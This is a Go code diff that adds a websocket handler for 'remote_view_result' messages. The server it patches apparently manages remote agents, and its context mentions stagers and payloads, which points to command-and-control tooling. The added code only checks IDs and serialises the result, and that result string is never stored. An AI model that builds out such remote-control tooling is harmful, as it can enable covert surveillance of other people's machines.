@@ -342,6 +342,32 @@ func InitRouter(init *config.Initialization) *gin.Engine {
 				}
 				responseBytes, _ := json.Marshal(response)
 				conn.WriteMessage(websocket.TextMessage, responseBytes)
+			} else if messageType == "remote_view_result" {
+
+				println("Remote view result received")
+				_, agentOk := message["agentId"].(string)
+				if !agentOk {
+					println("Invalid remote view result, no agent ID")
+					continue
+				}
+
+				_, commandOk := message["commandId"].(string)
+				if !commandOk {
+					println("Invalid remote view result, no command ID")
+					continue
+				}
+				result := message["result"]
+				// Convert result to string for storage
+				resultStr := ""
+				if result != nil {
+					resultBytes, err := json.Marshal(result)
+					if err == nil {
+						resultStr = string(resultBytes)
+					} else {
+						println("Error marshaling result:", err.Error())
+					}
+				}
+
 			} else if messageType == "payload_received" {
 				// Handle payload acknowledgment (stager -> agent upgrade)
 				agentID, _ := message["agentId"].(string)
